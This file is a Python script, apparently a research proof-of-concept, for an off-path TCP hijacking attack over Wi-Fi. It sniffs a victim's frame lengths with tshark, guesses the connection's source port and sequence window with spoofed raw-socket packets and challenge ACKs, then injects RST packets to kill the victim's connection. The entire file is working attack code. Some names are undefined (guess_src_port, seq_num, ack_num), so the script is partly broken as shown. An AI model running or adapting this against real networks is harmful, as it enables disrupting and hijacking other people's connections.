import time
import json
import random
import socket
import threading
import subprocess
from utils.rawsockets import Rawsockets


src_ip = "x.x.x.x"                # need to change
dst_ip = "x.x.x.x"                # need to change
NIC = "eth0"                      # need to change
victim_mac = "xx:xx:xx:xx:xx:xx"  # need to change
dst_port = 22                     # this port should choose by service
src_port = 12345                  # this param should be inferred
inw_seq = 123456                  # this param should be inferred
WIFI_HEADER_LENGTH = 117          # need to modify by packet capture
CHALLENGE_ACK_LENGTH = 129        # need to modify by packet capture
default_window_size = 60000       # default window size
all_time = 0

def listen_packets(packet_lengths, lock):
    victim_mac = "b8:27:eb:32:d6:1d"
    cmd = f"sudo tshark -i wlan0mon -Y \"(wlan.fc.type == 2) && (wlan.da == {victim_mac})\" -T fields -e frame.len -l"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("start listening")
    try:
        while True:
            line = proc.stdout.readline()
            if line:
                packet_length = int(line.strip())
                with lock:
                    packet_lengths.append(packet_length)
    finally:
        proc.terminate()


def check_consecutive_lengths(analyze_list):
    if len(analyze_list) < 1:
        return False, None
    else:
        analyze_list.sort(reverse=True)
        return True, analyze_list[0]


def guess_src_port_multi_bin():
    """
    This function is used to guess the src port of the victim by multi_bin.
    """
    global src_port, dst_port, lock, packet_lengths, all_time
    start_port = 32768
    end_port = 65535
    bin_num = 64
    one_round_per_bin = 16
    time_per_round = 2
    port_range = list(range(start_port, end_port))
    ports_per_bin = len(port_range) // bin_num
    bins = []

    for i in range(bin_num):
        start = i * ports_per_bin
        if i == bin_num - 1:
            end = len(port_range)
        else:
            end = start + ports_per_bin
        bins.append(port_range[start:end])

    reversed_rs = Rawsockets(dst_ip.encode('utf-8'), src_ip.encode('utf-8'))
    tt1 = time.time()
    # phase 1 -> know what bin have the correct Port
    which_bin = 0
    for round in range(bin_num // one_round_per_bin + 1):
        current_ports = []
        padding_lengths = []
        for i in range(round * one_round_per_bin, min((round + 1) * one_round_per_bin, bin_num)):
            current_ports += bins[i]
            padding_lengths += [i - round * one_round_per_bin] * len(bins[i])
        
        with lock:
            packet_lengths[:] = []
        reversed_rs.send_parallel_tcp_data(dst_port, current_ports, seq_num, ack_num, padding_lengths)
        time.sleep(time_per_round)
        found, packet_size = check_consecutive_lengths(packet_lengths)
        if found:
            which_bin = packet_size - (WIFI_HEADER_LENGTH) + round * one_round_per_bin - 1
            break
    
    # phase 2 -> know what Port is
    current_ports = bins[which_bin]
    padding_lengths = range(len(current_ports))
    with lock:
        packet_lengths[:] = []
    reversed_rs.send_parallel_tcp_data(dst_port, current_ports, seq_num, ack_num, padding_lengths)
    time.sleep(time_per_round)
    found, packet_size = check_consecutive_lengths(packet_lengths)
    if found:
        src_port = current_ports[packet_size - (WIFI_HEADER_LENGTH) - 1]
        all_time += time.time() - tt1
        print("[+] Time for guess src port: %s" % (all_time))
        print("[+] Guess src port: %s" % (src_port))
    
        with lock:
            packet_lengths[:] = []
        reversed_rs.send_parallel_tcp_data(dst_port, [src_port], seq_num, ack_num, [1]) 
        time.sleep(time_per_round)
        
        checked, _ = check_consecutive_lengths(packet_lengths)
        if checked:
            print("[+] Checked src port right")
        else:
            print("[-] Checked src port error!!")
            exit(0)
    else:
        print("error, not found Port in bin")
        exit(0)
    del(reversed_rs)


def check_challenge_ack(analyze_list):
    if CHALLENGE_ACK_LENGTH not in analyze_list:
        return False
    else:
        return True


def guess_seq_window_and_inject():
    global src_port, dst_port, inw_seq, all_time, lock, packet_lengths
    
    rs = Rawsockets(src_ip.encode('utf-8'), dst_ip.encode('utf-8'))
    def _send(nums):
        rs.send_parallel_rst(src_port, dst_port, nums, 0)
    
    total_nums = [i for i in range(0, 2**32, default_window_size)]
    
    per_num = 512 * 4
    
    seq_list = []
    for i in range(0, len(total_nums), per_num):
        seq_list.append(total_nums[i : i + per_num])
    
    t1 = time.time()
    i = 0
    cur_lists = []
    
    while i < len(seq_list):
        with lock:
            packet_lengths[:] = []

        _send(seq_list[i])
        time.sleep(1)
            
        print(i, seq_list[i][0], seq_list[i][-1], packet_lengths)
        if check_challenge_ack(packet_lengths):
            cur_lists = seq_list[i]
            break
        else:
            i += 1
    if cur_lists == []:
        print("[-] Guess seq window failed")
        exit(0)
    t2 = time.time()
    print("[+] Time for linear search: %s" % (t2 - t1))
    
    ll = 0
    rr = len(cur_lists)

    while True:
        if (rr - ll) == 1:
            break
        mm = (ll + rr) // 2
        ll_lists = cur_lists[ll : mm]
        with lock:
            packet_lengths[:] = []    
        _send(ll_lists)
        time.sleep(1.2)
        if check_challenge_ack(packet_lengths):
            rr = mm
        else:
            ll = mm

    t3 = time.time()
    all_time += t3 - t1
    print("[+] Time for guess seq window: %s" % (t3 - t1))
    print("[+] Guess seq window: %s" % (cur_lists[ll]))
    inw_seq = cur_lists[ll]
    with lock:
        packet_lengths[:] = []
    _send([inw_seq])
    time.sleep(1)
    if check_challenge_ack(packet_lengths):
        print("[+] Checked seq window right")
    else:
        print("[-] Checked seq window error!!")
        exit(0)
    
    # inject rst packets
    _send(range(inw_seq, inw_seq + default_window_size, 1))
    _send(range(inw_seq - default_window_size, inw_seq, 1))
    
    del(rs)


if __name__ == "__main__":
    packet_lengths = []
    lock = threading.Lock()
    listen_thread = threading.Thread(target=listen_packets, args=(packet_lengths, lock))
    listen_thread.start()
    
    guess_src_port()
    guess_seq_window_and_inject()

    print("all time: ", all_time)
